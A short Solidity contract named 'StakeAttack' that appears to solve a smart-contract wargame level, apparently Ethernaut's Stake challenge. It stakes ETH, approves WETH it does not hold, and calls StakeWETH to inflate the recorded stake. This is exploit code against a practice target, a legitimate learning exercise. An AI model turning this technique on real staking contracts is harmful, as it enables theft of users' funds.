// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IStake { // 1) change interface name
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
    function WETH() external view returns (address);
}

interface IWETH {
    function approve(address spender, uint256 value) external returns (bool);
}

contract StakeAttack { // 2) change nameattck

    IStake target;

    constructor(address _target) payable {

        target = IStake(_target);
    }
    function attack() external {

        target.StakeETH{value: 0.002 ether}();
        IWETH(target.WETH()).approve(address(target), 0.005 ether);
        target.StakeWETH(0.002 ether);
    }
}